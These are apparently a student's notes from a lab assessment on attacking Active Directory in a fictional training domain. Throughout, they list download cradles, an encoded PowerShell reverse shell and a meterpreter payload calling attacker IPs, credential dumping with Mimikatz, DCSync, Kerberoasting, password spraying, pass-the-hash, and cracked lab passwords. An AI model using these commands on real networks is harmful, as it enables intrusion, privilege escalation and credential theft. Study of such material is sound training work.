# Part I

AD Enumeration & Attacks - Skills Assessment Part I

Scenario
password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory.


Inlanefreight

Host Discovery:
arp -a



powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.30/PowerView.ps1', 'PowerView.ps1')

Better One to install using PS:
Invoke-WebRequest -Uri "http://10.10.15.253:8080/shell.exe" -OutFile "C:\shell.exe"

certutil.exe -urlcache -split -f "http://10.10.16.30/PowerView.ps1"


powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==


Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat

svc_sql:lucky7

$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password)
Enter-PSSession -ComputerName ACADEMY-EA-SQL01 -Credential $cred

certutil.exe -urlcache -split -f "http://10.10.16.30/SharpHound.exe"


certutil.exe -urlcache -split -f "http://10.10.16.30/SharpHound.ps1"


$username = "inlanefreight\svc_sql"
$password = "lucky7"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)

Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $cred

Standard Payload:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.253 LPORT=9999 -f exe > shell.exe

msfconsole > use multi/handler > set LHOST 10.10.15.253 > set LPORT 9999 > set payload windows/x64/meterpreter/reverse_tcp

Kerberoasting:
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Get-DomainUser -Identity svc_sql -SPN | Get-DomainSPNTicket –Format Hashcat | Out-File .\svc_sql_tgs_hash.txt

hashcat -m 13100 cleanhash /usr/share/wordlists/rockyou.txt


Find listening ports on Windows host using PS:
Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' }

xfreerdp file transfer with shares:
xfreerdp /v:localhost:8787 /u:”inlanefreight\svc_sql” /p:lucky7 /drive:<Drive-name>,/kali/folder/path


Getting hashusing mimikatz:
privilege::debug
sekurlsa::msv
logonpasswords

enable WDigest on the machine to receive cleartext creds for this authentication method:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown /r /t 0 /f

Run as different using in RDP:
runas /netonly /user:INLANEFREIGHT\tpetty powershell

DC Sync using Mimikatz:
lsadump::dcsync /domain:inlanefreight.local /user:inlanefreight\Administrator

# Part II

fping -r 1 -g 172.16.6.0/23 2>/dev/null 
172.16.7.3 is alive - DC01
172.16.7.50 is alive - MS01
172.16.7.60 is alive - SQL01

responder -I ens224

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt

hashcat -m 5600 ab920.ntlm /usr/share/wordlists/rockyou.txt


AB920:weasal
BR086:Welcome1
netdb:D@ta_bAse_adm1n!
CT059:charlie1

Credentialed AD user Enum:
python3 GetADUsers.py -all INLANEFREIGHT.LOCAL/AB920:weasal -dc-ip 172.16.7.3 > users.txt
crackmapexec smb 172.6.7.3 -u AB920 -p weasal –users ( this dumps many users same format 2 letters 3 numbers )

Verify users with no creds
kerbrute userenum — dc 172.16.7.3 -d inlanefreight.local usernames.txt -v



kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.7.3  usernames.txt Welcome1

mssqlclient.py INLANEFREIGHT/netdb:'D@ta_bAse_adm1n!'@172.16.7.60

enable_xp_cmdshell
xp_cmdshell whoami /priv

Finds objects that has GenericAll rights over Domain Admins:
Get-DomainObjectAcl -ResolveGUIDs -Identity "CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local" | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }

ConvertFrom-SID "S-1–5–21–3327542485–274640656–2609762496–4611"


after some attempts to find hashes, I realised we can run responder equivelant for windows called Inveigh.ps1


After a lot of messing around the only way I could get this to work was by getting a psexec sessions from SSH session with parrot box

psexec.py -hashes 00000000000000000000000000000000:bdaffbfe64f1fc646a3353be1c2c3c99 Administrator@172.16.7.50

Import-Module .\Inveigh.ps1

Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP 172.16.7.50 -FileOutput Y

There is 0 output in console so run Stop-Inveigh, and eventually you will see NTLMv2 File with the hash of targeted user in your current directory in powershell


unrestrict RDP
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:172.16.7.50 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99

add user to domain:
Net group “domain admins” ct059 /add /domain

hashdump from Linux:
secretsdump.py -just-dc CT059:charlie1@172.16.7.3 -outputfile LASTHASH

Powershell web shell:

https://github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx

Run sql queries:

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "Pwn3d_by_ACLs!" -query 'Select @@version'

xfreerdp domain:

xfreerdp /v:10.129.12.165 /u:wley /d:INLANEFREIGHT.LOCAL /p:transporter@4

Bloodhound-python

- **Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf**
```
cat /etc/resolv.conf
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

Once this is in place, we can run the tool against the target domain as follows:

- **Running bloodhound-python Against INLANEFREIGHT.LOCAL**
```
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```


zip -r ilfreight_bh.zip *.json
-------------------------------------
PingCastle - 
Group3r -
ADRecon -






